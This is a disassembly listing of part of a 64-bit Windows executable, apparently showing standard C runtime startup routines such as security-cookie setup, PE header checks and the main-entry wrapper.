   140001754:	e8 5b 09 00 00       	call   0x1400020b4
   140001759:	48 8d 0d a0 09 00 00 	lea    0x9a0(%rip),%rcx        # 0x140002100
   140001760:	e8 eb 05 00 00       	call   0x140001d50
   140001765:	e8 aa 06 00 00       	call   0x140001e14
   14000176a:	8b c8                	mov    %eax,%ecx
   14000176c:	e8 97 20 00 00       	call   0x140003808
   140001771:	85 c0                	test   %eax,%eax
   140001773:	75 4d                	jne    0x1400017c2
   140001775:	e8 ae 06 00 00       	call   0x140001e28
   14000177a:	e8 e9 06 00 00       	call   0x140001e68
   14000177f:	85 c0                	test   %eax,%eax
   140001781:	74 0c                	je     0x14000178f
   140001783:	48 8d 0d 8a 08 00 00 	lea    0x88a(%rip),%rcx        # 0x140002014
   14000178a:	e8 35 1e 00 00       	call   0x1400035c4
   14000178f:	e8 a4 06 00 00       	call   0x140001e38
   140001794:	e8 9f 06 00 00       	call   0x140001e38
   140001799:	e8 76 08 00 00       	call   0x140002014
   14000179e:	8b c8                	mov    %eax,%ecx
   1400017a0:	e8 7f 28 00 00       	call   0x140004024
   1400017a5:	e8 f6 23 00 00       	call   0x140003ba0
   1400017aa:	e8 65 08 00 00       	call   0x140002014
   1400017af:	33 c0                	xor    %eax,%eax
   1400017b1:	48 83 c4 20          	add    $0x20,%rsp
   1400017b5:	5b                   	pop    %rbx
   1400017b6:	c3                   	ret
   1400017b7:	b9 07 00 00 00       	mov    $0x7,%ecx
   1400017bc:	e8 cb 06 00 00       	call   0x140001e8c
   1400017c1:	cc                   	int3
   1400017c2:	b9 07 00 00 00       	mov    $0x7,%ecx
   1400017c7:	e8 c0 06 00 00       	call   0x140001e8c
   1400017cc:	cc                   	int3
   1400017cd:	90                   	nop
   1400017ce:	90                   	nop
   1400017cf:	90                   	nop
   1400017d0:	48 83 ec 28          	sub    $0x28,%rsp
   1400017d4:	e8 73 06 00 00       	call   0x140001e4c
   1400017d9:	33 c0                	xor    %eax,%eax
   1400017db:	48 83 c4 28          	add    $0x28,%rsp
   1400017df:	c3                   	ret
   1400017e0:	48 83 ec 28          	sub    $0x28,%rsp
   1400017e4:	e8 83 08 00 00       	call   0x14000206c
   1400017e9:	e8 26 08 00 00       	call   0x140002014
   1400017ee:	8b c8                	mov    %eax,%ecx
   1400017f0:	48 83 c4 28          	add    $0x28,%rsp
   1400017f4:	e9 9f 28 00 00       	jmp    0x140004098
   1400017f9:	90                   	nop
   1400017fa:	90                   	nop
   1400017fb:	90                   	nop
   1400017fc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001801:	57                   	push   %rdi
   140001802:	48 83 ec 30          	sub    $0x30,%rsp
   140001806:	b9 01 00 00 00       	mov    $0x1,%ecx
   14000180b:	e8 f0 02 00 00       	call   0x140001b00
   140001810:	84 c0                	test   %al,%al
   140001812:	75 0b                	jne    0x14000181f
   140001814:	b9 07 00 00 00       	mov    $0x7,%ecx
   140001819:	e8 6e 06 00 00       	call   0x140001e8c
   14000181e:	cc                   	int3
   14000181f:	40 32 ff             	xor    %dil,%dil
   140001822:	40 88 7c 24 20       	mov    %dil,0x20(%rsp)
   140001827:	e8 98 02 00 00       	call   0x140001ac4
   14000182c:	8a d8                	mov    %al,%bl
   14000182e:	8b 0d 0c 41 01 00    	mov    0x1410c(%rip),%ecx        # 0x140015940
   140001834:	83 f9 01             	cmp    $0x1,%ecx
   140001837:	75 0a                	jne    0x140001843
   140001839:	b9 07 00 00 00       	mov    $0x7,%ecx
   14000183e:	e8 49 06 00 00       	call   0x140001e8c
   140001843:	85 c9                	test   %ecx,%ecx
   140001845:	75 4a                	jne    0x140001891
   140001847:	c7 05 ef 40 01 00 01 	movl   $0x1,0x140ef(%rip)        # 0x140015940
   14000184e:	00 00 00 
   140001851:	48 8d 15 90 aa 00 00 	lea    0xaa90(%rip),%rdx        # 0x14000c2e8
   140001858:	48 8d 0d 51 aa 00 00 	lea    0xaa51(%rip),%rcx        # 0x14000c2b0
   14000185f:	e8 2c 24 00 00       	call   0x140003c90
   140001864:	85 c0                	test   %eax,%eax
   140001866:	74 0a                	je     0x140001872
   140001868:	b8 ff 00 00 00       	mov    $0xff,%eax
   14000186d:	e9 f9 00 00 00       	jmp    0x14000196b
   140001872:	48 8d 15 2f aa 00 00 	lea    0xaa2f(%rip),%rdx        # 0x14000c2a8
   140001879:	48 8d 0d 18 aa 00 00 	lea    0xaa18(%rip),%rcx        # 0x14000c298
   140001880:	e8 93 23 00 00       	call   0x140003c18
   140001885:	c7 05 b1 40 01 00 02 	movl   $0x2,0x140b1(%rip)        # 0x140015940
   14000188c:	00 00 00 
   14000188f:	eb 08                	jmp    0x140001899
   140001891:	40 b7 01             	mov    $0x1,%dil
   140001894:	40 88 7c 24 20       	mov    %dil,0x20(%rsp)
   140001899:	8a cb                	mov    %bl,%cl
   14000189b:	e8 10 04 00 00       	call   0x140001cb0
   1400018a0:	e8 cf 05 00 00       	call   0x140001e74
   1400018a5:	48 8b d8             	mov    %rax,%rbx
   1400018a8:	48 83 38 00          	cmpq   $0x0,(%rax)
   1400018ac:	74 22                	je     0x1400018d0
   1400018ae:	48 8b c8             	mov    %rax,%rcx
   1400018b1:	e8 5e 03 00 00       	call   0x140001c14
   1400018b6:	84 c0                	test   %al,%al
   1400018b8:	74 16                	je     0x1400018d0
   1400018ba:	48 8b 1b             	mov    (%rbx),%rbx
   1400018bd:	48 8b cb             	mov    %rbx,%rcx
   1400018c0:	e8 87 08 00 00       	call   0x14000214c
   1400018c5:	45 33 c0             	xor    %r8d,%r8d
   1400018c8:	41 8d 50 02          	lea    0x2(%r8),%edx
   1400018cc:	33 c9                	xor    %ecx,%ecx
   1400018ce:	ff d3                	call   *%rbx
   1400018d0:	e8 a7 05 00 00       	call   0x140001e7c
   1400018d5:	48 8b d8             	mov    %rax,%rbx
   1400018d8:	48 83 38 00          	cmpq   $0x0,(%rax)
   1400018dc:	74 14                	je     0x1400018f2
   1400018de:	48 8b c8             	mov    %rax,%rcx
   1400018e1:	e8 2e 03 00 00       	call   0x140001c14
   1400018e6:	84 c0                	test   %al,%al
   1400018e8:	74 08                	je     0x1400018f2
   1400018ea:	48 8b 0b             	mov    (%rbx),%rcx
   1400018ed:	e8 4e 26 00 00       	call   0x140003f40
   1400018f2:	33 c9                	xor    %ecx,%ecx
   1400018f4:	e8 4b 10 00 00       	call   0x140002944
   1400018f9:	e8 d6 06 00 00       	call   0x140001fd4
   1400018fe:	0f b7 d8             	movzwl %ax,%ebx
   140001901:	e8 a2 22 00 00       	call   0x140003ba8
   140001906:	4c 8b c0             	mov    %rax,%r8
   140001909:	44 8b cb             	mov    %ebx,%r9d
   14000190c:	33 d2                	xor    %edx,%edx
   14000190e:	48 8d 0d eb e6 ff ff 	lea    -0x1915(%rip),%rcx        # 0x140000000
   140001915:	e8 0a fb ff ff       	call   0x140001424
   14000191a:	8b d8                	mov    %eax,%ebx
   14000191c:	33 c9                	xor    %ecx,%ecx
   14000191e:	e8 39 11 00 00       	call   0x140002a5c
   140001923:	e8 f0 06 00 00       	call   0x140002018
   140001928:	84 c0                	test   %al,%al
   14000192a:	75 07                	jne    0x140001933
   14000192c:	8b cb                	mov    %ebx,%ecx
   14000192e:	e8 51 26 00 00       	call   0x140003f84
   140001933:	40 84 ff             	test   %dil,%dil
   140001936:	75 05                	jne    0x14000193d
   140001938:	e8 e7 25 00 00       	call   0x140003f24
   14000193d:	33 d2                	xor    %edx,%edx
   14000193f:	b1 01                	mov    $0x1,%cl
   140001941:	e8 8e 03 00 00       	call   0x140001cd4
   140001946:	8b c3                	mov    %ebx,%eax
   140001948:	eb 21                	jmp    0x14000196b
   14000194a:	8b d8                	mov    %eax,%ebx
   14000194c:	e8 c7 06 00 00       	call   0x140002018
   140001951:	84 c0                	test   %al,%al
   140001953:	75 08                	jne    0x14000195d
   140001955:	8b cb                	mov    %ebx,%ecx
   140001957:	e8 d8 25 00 00       	call   0x140003f34
   14000195c:	cc                   	int3
   14000195d:	80 7c 24 20 00       	cmpb   $0x0,0x20(%rsp)
   140001962:	75 05                	jne    0x140001969
   140001964:	e8 ab 25 00 00       	call   0x140003f14
   140001969:	8b c3                	mov    %ebx,%eax
   14000196b:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140001970:	48 83 c4 30          	add    $0x30,%rsp
   140001974:	5f                   	pop    %rdi
   140001975:	c3                   	ret
   140001976:	90                   	nop
   140001977:	90                   	nop
   140001978:	48 83 ec 28          	sub    $0x28,%rsp
   14000197c:	e8 e7 03 00 00       	call   0x140001d68
   140001981:	48 83 c4 28          	add    $0x28,%rsp
   140001985:	e9 72 fe ff ff       	jmp    0x1400017fc
   14000198a:	90                   	nop
   14000198b:	90                   	nop
   14000198c:	48 83 ec 28          	sub    $0x28,%rsp
   140001990:	4d 8b 41 38          	mov    0x38(%r9),%r8
   140001994:	48 8b ca             	mov    %rdx,%rcx
   140001997:	49 8b d1             	mov    %r9,%rdx
   14000199a:	e8 0d 00 00 00       	call   0x1400019ac
   14000199f:	b8 01 00 00 00       	mov    $0x1,%eax
   1400019a4:	48 83 c4 28          	add    $0x28,%rsp
   1400019a8:	c3                   	ret
   1400019a9:	90                   	nop
   1400019aa:	90                   	nop
   1400019ab:	90                   	nop
   1400019ac:	53                   	push   %rbx
   1400019ad:	45 8b 18             	mov    (%r8),%r11d
   1400019b0:	48 8b da             	mov    %rdx,%rbx
   1400019b3:	41 83 e3 f8          	and    $0xfffffff8,%r11d
   1400019b7:	4c 8b c9             	mov    %rcx,%r9
   1400019ba:	41 f6 00 04          	testb  $0x4,(%r8)
   1400019be:	4c 8b d1             	mov    %rcx,%r10
   1400019c1:	74 13                	je     0x1400019d6
   1400019c3:	41 8b 40 08          	mov    0x8(%r8),%eax
   1400019c7:	4d 63 50 04          	movslq 0x4(%r8),%r10
   1400019cb:	f7 d8                	neg    %eax
   1400019cd:	4c 03 d1             	add    %rcx,%r10
   1400019d0:	48 63 c8             	movslq %eax,%rcx
   1400019d3:	4c 23 d1             	and    %rcx,%r10
   1400019d6:	49 63 c3             	movslq %r11d,%rax
   1400019d9:	4a 8b 14 10          	mov    (%rax,%r10,1),%rdx
   1400019dd:	48 8b 43 10          	mov    0x10(%rbx),%rax
   1400019e1:	8b 48 08             	mov    0x8(%rax),%ecx
   1400019e4:	48 03 4b 08          	add    0x8(%rbx),%rcx
   1400019e8:	f6 41 03 0f          	testb  $0xf,0x3(%rcx)
   1400019ec:	74 0c                	je     0x1400019fa
   1400019ee:	0f b6 41 03          	movzbl 0x3(%rcx),%eax
   1400019f2:	83 e0 f0             	and    $0xfffffff0,%eax
   1400019f5:	48 98                	cltq
   1400019f7:	4c 03 c8             	add    %rax,%r9
   1400019fa:	4c 33 ca             	xor    %rdx,%r9
   1400019fd:	49 8b c9             	mov    %r9,%rcx
   140001a00:	5b                   	pop    %rbx
   140001a01:	e9 9a 00 00 00       	jmp    0x140001aa0
   140001a06:	90                   	nop
   140001a07:	90                   	nop
   140001a08:	48 8b c4             	mov    %rsp,%rax
   140001a0b:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140001a0f:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140001a13:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140001a17:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140001a1b:	41 56                	push   %r14
   140001a1d:	48 83 ec 20          	sub    $0x20,%rsp
   140001a21:	4d 8b 51 38          	mov    0x38(%r9),%r10
   140001a25:	48 8b f2             	mov    %rdx,%rsi
   140001a28:	4d 8b f0             	mov    %r8,%r14
   140001a2b:	48 8b e9             	mov    %rcx,%rbp
   140001a2e:	49 8b d1             	mov    %r9,%rdx
   140001a31:	48 8b ce             	mov    %rsi,%rcx
   140001a34:	49 8b f9             	mov    %r9,%rdi
   140001a37:	41 8b 1a             	mov    (%r10),%ebx
   140001a3a:	48 c1 e3 04          	shl    $0x4,%rbx
   140001a3e:	49 03 da             	add    %r10,%rbx
   140001a41:	4c 8d 43 04          	lea    0x4(%rbx),%r8
   140001a45:	e8 62 ff ff ff       	call   0x1400019ac
   140001a4a:	44 8b 5b 04          	mov    0x4(%rbx),%r11d
   140001a4e:	ba 01 00 00 00       	mov    $0x1,%edx
   140001a53:	44 8b 55 04          	mov    0x4(%rbp),%r10d
   140001a57:	41 8b c3             	mov    %r11d,%eax
   140001a5a:	23 c2                	and    %edx,%eax
   140001a5c:	41 83 e3 02          	and    $0x2,%r11d
   140001a60:	41 80 e2 66          	and    $0x66,%r10b
   140001a64:	44 0f 44 d8          	cmove  %eax,%r11d
   140001a68:	45 85 db             	test   %r11d,%r11d
   140001a6b:	74 13                	je     0x140001a80
   140001a6d:	4c 8b cf             	mov    %rdi,%r9
   140001a70:	4d 8b c6             	mov    %r14,%r8
   140001a73:	48 8b d6             	mov    %rsi,%rdx
   140001a76:	48 8b cd             	mov    %rbp,%rcx
   140001a79:	e8 42 0b 00 00       	call   0x1400025c0
   140001a7e:	8b d0                	mov    %eax,%edx
   140001a80:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001a85:	8b c2                	mov    %edx,%eax
   140001a87:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140001a8c:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140001a91:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   140001a96:	48 83 c4 20          	add    $0x20,%rsp
   140001a9a:	41 5e                	pop    %r14
   140001a9c:	c3                   	ret
   140001a9d:	90                   	nop
   140001a9e:	90                   	nop
   140001a9f:	90                   	nop
   140001aa0:	48 3b 0d 71 35 01 00 	cmp    0x13571(%rip),%rcx        # 0x140015018
   140001aa7:	f2 75 12             	bnd jne 0x140001abc
   140001aaa:	48 c1 c1 10          	rol    $0x10,%rcx
   140001aae:	66 f7 c1 ff ff       	test   $0xffff,%cx
   140001ab3:	f2 75 02             	bnd jne 0x140001ab8
   140001ab6:	f2 c3                	bnd ret
   140001ab8:	48 c1 c9 10          	ror    $0x10,%rcx
   140001abc:	e9 c7 06 00 00       	jmp    0x140002188
   140001ac1:	90                   	nop
   140001ac2:	90                   	nop
   140001ac3:	90                   	nop
   140001ac4:	48 83 ec 28          	sub    $0x28,%rsp
   140001ac8:	e8 e7 0a 00 00       	call   0x1400025b4
   140001acd:	85 c0                	test   %eax,%eax
   140001acf:	74 21                	je     0x140001af2
   140001ad1:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
   140001ad8:	00 00 
   140001ada:	48 8b 48 08          	mov    0x8(%rax),%rcx
   140001ade:	eb 05                	jmp    0x140001ae5
   140001ae0:	48 3b c8             	cmp    %rax,%rcx
   140001ae3:	74 14                	je     0x140001af9
   140001ae5:	33 c0                	xor    %eax,%eax
   140001ae7:	f0 48 0f b1 0d 58 3e 	lock cmpxchg %rcx,0x13e58(%rip)        # 0x140015948
   140001aee:	01 00 
   140001af0:	75 ee                	jne    0x140001ae0
   140001af2:	32 c0                	xor    %al,%al
   140001af4:	48 83 c4 28          	add    $0x28,%rsp
   140001af8:	c3                   	ret
   140001af9:	b0 01                	mov    $0x1,%al
   140001afb:	eb f7                	jmp    0x140001af4
   140001afd:	90                   	nop
   140001afe:	90                   	nop
   140001aff:	90                   	nop
   140001b00:	53                   	push   %rbx
   140001b01:	48 83 ec 20          	sub    $0x20,%rsp
   140001b05:	0f b6 05 74 3e 01 00 	movzbl 0x13e74(%rip),%eax        # 0x140015980
   140001b0c:	85 c9                	test   %ecx,%ecx
   140001b0e:	bb 01 00 00 00       	mov    $0x1,%ebx
   140001b13:	0f 44 c3             	cmove  %ebx,%eax
   140001b16:	88 05 64 3e 01 00    	mov    %al,0x13e64(%rip)        # 0x140015980
   140001b1c:	e8 cf 08 00 00       	call   0x1400023f0
   140001b21:	e8 82 10 00 00       	call   0x140002ba8
   140001b26:	84 c0                	test   %al,%al
   140001b28:	75 04                	jne    0x140001b2e
   140001b2a:	32 c0                	xor    %al,%al
   140001b2c:	eb 14                	jmp    0x140001b42
   140001b2e:	e8 5d 2b 00 00       	call   0x140004690
   140001b33:	84 c0                	test   %al,%al
   140001b35:	75 09                	jne    0x140001b40
   140001b37:	33 c9                	xor    %ecx,%ecx
   140001b39:	e8 a2 10 00 00       	call   0x140002be0
   140001b3e:	eb ea                	jmp    0x140001b2a
   140001b40:	8a c3                	mov    %bl,%al
   140001b42:	48 83 c4 20          	add    $0x20,%rsp
   140001b46:	5b                   	pop    %rbx
   140001b47:	c3                   	ret
   140001b48:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001b4d:	55                   	push   %rbp
   140001b4e:	48 8b ec             	mov    %rsp,%rbp
   140001b51:	48 83 ec 40          	sub    $0x40,%rsp
   140001b55:	8b d9                	mov    %ecx,%ebx
   140001b57:	83 f9 01             	cmp    $0x1,%ecx
   140001b5a:	0f 87 a6 00 00 00    	ja     0x140001c06
   140001b60:	e8 4f 0a 00 00       	call   0x1400025b4
   140001b65:	85 c0                	test   %eax,%eax
   140001b67:	74 2b                	je     0x140001b94
   140001b69:	85 db                	test   %ebx,%ebx
   140001b6b:	75 27                	jne    0x140001b94
   140001b6d:	48 8d 0d dc 3d 01 00 	lea    0x13ddc(%rip),%rcx        # 0x140015950
   140001b74:	e8 57 29 00 00       	call   0x1400044d0
   140001b79:	85 c0                	test   %eax,%eax
   140001b7b:	74 04                	je     0x140001b81
   140001b7d:	32 c0                	xor    %al,%al
   140001b7f:	eb 7a                	jmp    0x140001bfb
   140001b81:	48 8d 0d e0 3d 01 00 	lea    0x13de0(%rip),%rcx        # 0x140015968
   140001b88:	e8 43 29 00 00       	call   0x1400044d0
   140001b8d:	85 c0                	test   %eax,%eax
   140001b8f:	0f 94 c0             	sete   %al
   140001b92:	eb 67                	jmp    0x140001bfb
   140001b94:	48 8b 15 7d 34 01 00 	mov    0x1347d(%rip),%rdx        # 0x140015018
   140001b9b:	49 83 c8 ff          	or     $0xffffffffffffffff,%r8
   140001b9f:	8b c2                	mov    %edx,%eax
   140001ba1:	b9 40 00 00 00       	mov    $0x40,%ecx
   140001ba6:	83 e0 3f             	and    $0x3f,%eax
   140001ba9:	2b c8                	sub    %eax,%ecx
   140001bab:	b0 01                	mov    $0x1,%al
   140001bad:	49 d3 c8             	ror    %cl,%r8
   140001bb0:	4c 33 c2             	xor    %rdx,%r8
   140001bb3:	4c 89 45 e0          	mov    %r8,-0x20(%rbp)
   140001bb7:	4c 89 45 e8          	mov    %r8,-0x18(%rbp)
   140001bbb:	0f 10 45 e0          	movups -0x20(%rbp),%xmm0
   140001bbf:	4c 89 45 f0          	mov    %r8,-0x10(%rbp)
   140001bc3:	f2 0f 10 4d f0       	movsd  -0x10(%rbp),%xmm1
   140001bc8:	0f 11 05 81 3d 01 00 	movups %xmm0,0x13d81(%rip)        # 0x140015950
   140001bcf:	4c 89 45 e0          	mov    %r8,-0x20(%rbp)
   140001bd3:	4c 89 45 e8          	mov    %r8,-0x18(%rbp)
   140001bd7:	0f 10 45 e0          	movups -0x20(%rbp),%xmm0
   140001bdb:	4c 89 45 f0          	mov    %r8,-0x10(%rbp)
   140001bdf:	f2 0f 11 0d 79 3d 01 	movsd  %xmm1,0x13d79(%rip)        # 0x140015960
   140001be6:	00 
   140001be7:	f2 0f 10 4d f0       	movsd  -0x10(%rbp),%xmm1
   140001bec:	0f 11 05 75 3d 01 00 	movups %xmm0,0x13d75(%rip)        # 0x140015968
   140001bf3:	f2 0f 11 0d 7d 3d 01 	movsd  %xmm1,0x13d7d(%rip)        # 0x140015978
   140001bfa:	00 
   140001bfb:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140001c00:	48 83 c4 40          	add    $0x40,%rsp
   140001c04:	5d                   	pop    %rbp
   140001c05:	c3                   	ret
   140001c06:	b9 05 00 00 00       	mov    $0x5,%ecx
   140001c0b:	e8 7c 02 00 00       	call   0x140001e8c
   140001c10:	cc                   	int3
   140001c11:	90                   	nop
   140001c12:	90                   	nop
   140001c13:	90                   	nop
   140001c14:	48 83 ec 18          	sub    $0x18,%rsp
   140001c18:	4c 8b c1             	mov    %rcx,%r8
   140001c1b:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
   140001c20:	66 39 05 d9 e3 ff ff 	cmp    %ax,-0x1c27(%rip)        # 0x140000000
   140001c27:	75 7c                	jne    0x140001ca5
   140001c29:	48 63 05 0c e4 ff ff 	movslq -0x1bf4(%rip),%rax        # 0x14000003c
   140001c30:	48 8d 15 c9 e3 ff ff 	lea    -0x1c37(%rip),%rdx        # 0x140000000
   140001c37:	48 8d 0c 10          	lea    (%rax,%rdx,1),%rcx
   140001c3b:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   140001c41:	75 62                	jne    0x140001ca5
   140001c43:	b8 0b 02 00 00       	mov    $0x20b,%eax
   140001c48:	66 39 41 18          	cmp    %ax,0x18(%rcx)
   140001c4c:	75 57                	jne    0x140001ca5
   140001c4e:	4c 2b c2             	sub    %rdx,%r8
   140001c51:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
   140001c55:	48 8d 51 18          	lea    0x18(%rcx),%rdx
   140001c59:	48 03 d0             	add    %rax,%rdx
   140001c5c:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   140001c60:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   140001c64:	4c 8d 0c ca          	lea    (%rdx,%rcx,8),%r9
   140001c68:	48 89 14 24          	mov    %rdx,(%rsp)
   140001c6c:	49 3b d1             	cmp    %r9,%rdx
   140001c6f:	74 18                	je     0x140001c89
   140001c71:	8b 4a 0c             	mov    0xc(%rdx),%ecx
   140001c74:	4c 3b c1             	cmp    %rcx,%r8
   140001c77:	72 0a                	jb     0x140001c83
   140001c79:	8b 42 08             	mov    0x8(%rdx),%eax
   140001c7c:	03 c1                	add    %ecx,%eax
   140001c7e:	4c 3b c0             	cmp    %rax,%r8
   140001c81:	72 08                	jb     0x140001c8b
   140001c83:	48 83 c2 28          	add    $0x28,%rdx
   140001c87:	eb df                	jmp    0x140001c68
   140001c89:	33 d2                	xor    %edx,%edx
   140001c8b:	48 85 d2             	test   %rdx,%rdx
   140001c8e:	75 04                	jne    0x140001c94
   140001c90:	32 c0                	xor    %al,%al
   140001c92:	eb 17                	jmp    0x140001cab
   140001c94:	f7 42 24 00 00 00 80 	testl  $0x80000000,0x24(%rdx)
   140001c9b:	74 04                	je     0x140001ca1
   140001c9d:	32 c0                	xor    %al,%al
   140001c9f:	eb 0a                	jmp    0x140001cab
   140001ca1:	b0 01                	mov    $0x1,%al
   140001ca3:	eb 06                	jmp    0x140001cab
   140001ca5:	32 c0                	xor    %al,%al
   140001ca7:	eb 02                	jmp    0x140001cab
   140001ca9:	32 c0                	xor    %al,%al
   140001cab:	48 83 c4 18          	add    $0x18,%rsp
   140001caf:	c3                   	ret
   140001cb0:	53                   	push   %rbx
   140001cb1:	48 83 ec 20          	sub    $0x20,%rsp
   140001cb5:	8a d9                	mov    %cl,%bl
   140001cb7:	e8 f8 08 00 00       	call   0x1400025b4
   140001cbc:	33 d2                	xor    %edx,%edx
   140001cbe:	85 c0                	test   %eax,%eax
   140001cc0:	74 0b                	je     0x140001ccd
   140001cc2:	84 db                	test   %bl,%bl
   140001cc4:	75 07                	jne    0x140001ccd
   140001cc6:	48 87 15 7b 3c 01 00 	xchg   %rdx,0x13c7b(%rip)        # 0x140015948
   140001ccd:	48 83 c4 20          	add    $0x20,%rsp
   140001cd1:	5b                   	pop    %rbx
   140001cd2:	c3                   	ret
   140001cd3:	90                   	nop
   140001cd4:	53                   	push   %rbx
   140001cd5:	48 83 ec 20          	sub    $0x20,%rsp
   140001cd9:	80 3d a0 3c 01 00 00 	cmpb   $0x0,0x13ca0(%rip)        # 0x140015980
   140001ce0:	8a d9                	mov    %cl,%bl
   140001ce2:	74 04                	je     0x140001ce8
   140001ce4:	84 d2                	test   %dl,%dl
   140001ce6:	75 0e                	jne    0x140001cf6
   140001ce8:	8a cb                	mov    %bl,%cl
   140001cea:	e8 b5 29 00 00       	call   0x1400046a4
   140001cef:	8a cb                	mov    %bl,%cl
   140001cf1:	e8 ea 0e 00 00       	call   0x140002be0
   140001cf6:	b0 01                	mov    $0x1,%al
   140001cf8:	48 83 c4 20          	add    $0x20,%rsp
   140001cfc:	5b                   	pop    %rbx
   140001cfd:	c3                   	ret
   140001cfe:	90                   	nop
   140001cff:	90                   	nop
   140001d00:	53                   	push   %rbx
   140001d01:	48 83 ec 20          	sub    $0x20,%rsp
   140001d05:	48 8b 15 0c 33 01 00 	mov    0x1330c(%rip),%rdx        # 0x140015018
   140001d0c:	48 8b d9             	mov    %rcx,%rbx
   140001d0f:	8b ca                	mov    %edx,%ecx
   140001d11:	48 33 15 38 3c 01 00 	xor    0x13c38(%rip),%rdx        # 0x140015950
   140001d18:	83 e1 3f             	and    $0x3f,%ecx
   140001d1b:	48 d3 ca             	ror    %cl,%rdx
   140001d1e:	48 83 fa ff          	cmp    $0xffffffffffffffff,%rdx
   140001d22:	75 0a                	jne    0x140001d2e
   140001d24:	48 8b cb             	mov    %rbx,%rcx
   140001d27:	e8 58 27 00 00       	call   0x140004484
   140001d2c:	eb 0f                	jmp    0x140001d3d
   140001d2e:	48 8b d3             	mov    %rbx,%rdx
   140001d31:	48 8d 0d 18 3c 01 00 	lea    0x13c18(%rip),%rcx        # 0x140015950
   140001d38:	e8 d3 27 00 00       	call   0x140004510
   140001d3d:	33 c9                	xor    %ecx,%ecx
   140001d3f:	85 c0                	test   %eax,%eax
   140001d41:	48 0f 44 cb          	cmove  %rbx,%rcx
   140001d45:	48 8b c1             	mov    %rcx,%rax
   140001d48:	48 83 c4 20          	add    $0x20,%rsp
   140001d4c:	5b                   	pop    %rbx
   140001d4d:	c3                   	ret
   140001d4e:	90                   	nop
   140001d4f:	90                   	nop
   140001d50:	48 83 ec 28          	sub    $0x28,%rsp
   140001d54:	e8 a7 ff ff ff       	call   0x140001d00
   140001d59:	48 f7 d8             	neg    %rax
   140001d5c:	1b c0                	sbb    %eax,%eax
   140001d5e:	f7 d8                	neg    %eax
   140001d60:	ff c8                	dec    %eax
   140001d62:	48 83 c4 28          	add    $0x28,%rsp
   140001d66:	c3                   	ret
   140001d67:	90                   	nop
   140001d68:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140001d6d:	55                   	push   %rbp
   140001d6e:	48 8b ec             	mov    %rsp,%rbp
   140001d71:	48 83 ec 20          	sub    $0x20,%rsp
   140001d75:	48 83 65 18 00       	andq   $0x0,0x18(%rbp)
   140001d7a:	48 bb 32 a2 df 2d 99 	movabs $0x2b992ddfa232,%rbx
   140001d81:	2b 00 00 
   140001d84:	48 8b 05 8d 32 01 00 	mov    0x1328d(%rip),%rax        # 0x140015018
   140001d8b:	48 3b c3             	cmp    %rbx,%rax
   140001d8e:	75 6f                	jne    0x140001dff
   140001d90:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   140001d94:	ff 15 f6 a2 00 00    	call   *0xa2f6(%rip)        # 0x14000c090
   140001d9a:	48 8b 45 18          	mov    0x18(%rbp),%rax
   140001d9e:	48 89 45 10          	mov    %rax,0x10(%rbp)
   140001da2:	ff 15 e0 a2 00 00    	call   *0xa2e0(%rip)        # 0x14000c088
   140001da8:	8b c0                	mov    %eax,%eax
   140001daa:	48 31 45 10          	xor    %rax,0x10(%rbp)
   140001dae:	ff 15 cc a2 00 00    	call   *0xa2cc(%rip)        # 0x14000c080
   140001db4:	8b c0                	mov    %eax,%eax
   140001db6:	48 8d 4d 20          	lea    0x20(%rbp),%rcx
   140001dba:	48 31 45 10          	xor    %rax,0x10(%rbp)
   140001dbe:	ff 15 b4 a2 00 00    	call   *0xa2b4(%rip)        # 0x14000c078
   140001dc4:	8b 45 20             	mov    0x20(%rbp),%eax
   140001dc7:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   140001dcb:	48 c1 e0 20          	shl    $0x20,%rax
   140001dcf:	48 33 45 20          	xor    0x20(%rbp),%rax
   140001dd3:	48 33 45 10          	xor    0x10(%rbp),%rax
   140001dd7:	48 33 c1             	xor    %rcx,%rax
   140001dda:	48 b9 ff ff ff ff ff 	movabs $0xffffffffffff,%rcx
   140001de1:	ff 00 00 
   140001de4:	48 23 c1             	and    %rcx,%rax
   140001de7:	48 b9 33 a2 df 2d 99 	movabs $0x2b992ddfa233,%rcx
   140001dee:	2b 00 00 
   140001df1:	48 3b c3             	cmp    %rbx,%rax
   140001df4:	48 0f 44 c1          	cmove  %rcx,%rax
   140001df8:	48 89 05 19 32 01 00 	mov    %rax,0x13219(%rip)        # 0x140015018
   140001dff:	48 8b 5c 24 48       	mov    0x48(%rsp),%rbx
   140001e04:	48 f7 d0             	not    %rax
   140001e07:	48 89 05 12 32 01 00 	mov    %rax,0x13212(%rip)        # 0x140015020
   140001e0e:	48 83 c4 20          	add    $0x20,%rsp
   140001e12:	5d                   	pop    %rbp
   140001e13:	c3                   	ret
   140001e14:	b8 01 00 00 00       	mov    $0x1,%eax
   140001e19:	c3                   	ret
   140001e1a:	90                   	nop
   140001e1b:	90                   	nop
   140001e1c:	90                   	nop
   140001e1d:	90                   	nop
   140001e1e:	90                   	nop
   140001e1f:	90                   	nop
   140001e20:	b8 00 40 00 00       	mov    $0x4000,%eax
   140001e25:	c3                   	ret
   140001e26:	90                   	nop
   140001e27:	90                   	nop
   140001e28:	48 8d 0d 61 3b 01 00 	lea    0x13b61(%rip),%rcx        # 0x140015990
   140001e2f:	48 ff 25 62 a2 00 00 	rex.W jmp *0xa262(%rip)        # 0x14000c098
   140001e36:	90                   	nop
   140001e37:	90                   	nop
   140001e38:	c2 00 00             	ret    $0x0
   140001e3b:	90                   	nop
